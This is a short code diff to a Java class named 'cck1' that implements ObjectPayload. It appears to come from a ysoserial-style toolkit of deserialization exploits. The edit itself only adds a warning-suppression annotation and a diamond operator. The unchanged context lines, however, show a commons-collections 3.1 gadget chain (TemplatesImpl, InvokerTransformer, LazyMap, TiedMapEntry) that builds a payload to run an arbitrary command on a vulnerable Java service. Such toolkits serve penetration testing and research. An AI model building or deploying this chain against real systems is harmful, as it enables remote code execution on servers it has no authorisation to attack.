@@ -21,6 +21,7 @@ import java.util.Map;
  * templates...
  */
 
+@SuppressWarnings({"rawtypes", "unchecked","unused"})
 @Dependencies({"commons-collections:commons-collections:3.1"})
 public class cck1 implements ObjectPayload<Object> {
 
@@ -29,7 +30,7 @@ public class cck1 implements ObjectPayload<Object> {
         final Object templates;
         templates = Gadgets.createTemplatesImpl(command);
         InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
-        HashMap<String, String> innerMap = new HashMap<String, String>();
+        HashMap<String, String> innerMap = new HashMap<>();
         Map m = LazyMap.decorate(innerMap, transformer);
         Map outerMap = new HashMap();
         TiedMapEntry tied = new TiedMapEntry(m, templates);
